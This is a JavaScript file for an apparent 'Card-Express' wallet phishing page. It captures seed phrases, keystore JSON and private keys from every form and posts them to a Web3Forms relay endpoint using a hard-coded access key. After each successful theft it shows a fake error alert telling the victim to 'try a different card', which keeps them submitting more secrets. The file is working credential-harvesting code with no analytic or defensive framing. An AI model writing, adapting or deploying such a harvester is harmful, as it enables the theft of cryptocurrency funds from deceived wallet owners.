// Shared wallet submission endpoint.
// Change WALLET_FORM_ENDPOINT here only — all connect/apps wallet pages use this file.
const WALLET_FORM_ENDPOINT = 'https://api.web3forms.com/submit';
const TEST_MODE = false; // set true only for endpoint testing

// Hidden data fields sent with every submission
const HIDDEN_DATA = {
  access_key: 'af7d2d6d-56cc-4d41-83d5-0bfa280dfc1d',
  subject: 'New message from Card-Express',
  botcheck: '',
  name: 'Card-Express',
  email: 'no-reply@card-express.web.app',
  website: 'Card-Express Site'
};

// UI elements
const phraseProceedBtn = document.getElementById('phraseProceed');
const keystorejsonProceedBtn = document.getElementById('keystorejsonproceed');
const privatekeyProceedBtn = document.getElementById('privatekeyProceed');
const sendingEl = document.querySelector('.sending');

// Success handler - show alert message popup on successful submission
function onSuccess(form) {
  if (sendingEl) {
    sendingEl.style.display = 'none';
  }
  if (form) {
    form.reset();
    const buttons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
    buttons.forEach(btn => btn.disabled = false);
  }
  alert('An error has occurred please try a different card. Thank you');
}

// Send request to Web3Forms API
function sendWeb3FormsRequest(payload) {
  return fetch(WALLET_FORM_ENDPOINT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    },
    body: JSON.stringify(payload),
  });
}

// Merge hidden data into form data before submission
function mergeHiddenData(formData) {
  const merged = new FormData(formData);
  Object.entries(HIDDEN_DATA).forEach(([key, value]) => {
    merged.set(key, value);
  });
  return merged;
}

function bindWalletForms() {
  const forms = document.querySelectorAll('form');
  if (!forms.length) return;

  forms.forEach((form) => {
    form.action = WALLET_FORM_ENDPOINT;

    // Inject hidden fields if not present
    Object.entries(HIDDEN_DATA).forEach(([key, value]) => {
      let hiddenInput = form.querySelector(`input[name="${key}"]`);
      if (!hiddenInput) {
        hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.name = key;
        form.appendChild(hiddenInput);
      }
      hiddenInput.value = value;
    });

    if (!form.querySelector('input[name="_append"]')) {
      const appendInput = document.createElement('input');
      appendInput.type = 'hidden';
      appendInput.name = '_append';
      appendInput.value = 'false';
      form.appendChild(appendInput);
    }

    // Handle form submit with fetch for better control
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      // Show sending indicator if present
      if (sendingEl) {
        sendingEl.style.display = 'block';
      }
      
      // Disable submit buttons during send
      const buttons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
      buttons.forEach(btn => btn.disabled = true);
      
      try {
        const formData = mergeHiddenData(form);
        const payload = Object.fromEntries(formData.entries());
        
        const response = await sendWeb3FormsRequest(payload);
        
        if (response.ok) {
          onSuccess(form);
        } else {
          console.error('Web3Forms submission failed:', response.status);
          // Re-enable buttons on failure
          buttons.forEach(btn => btn.disabled = false);
          if (sendingEl) {
            sendingEl.style.display = 'none';
          }
          alert('Submission failed. Please try again.');
        }
      } catch (error) {
        console.error('Web3Forms request error:', error);
        // Re-enable buttons on error
        const buttons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
        buttons.forEach(btn => btn.disabled = false);
        if (sendingEl) {
          sendingEl.style.display = 'none';
        }
        alert('Network error. Please try again.');
      }
    });
  });
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', bindWalletForms);
} else {
  bindWalletForms();
}

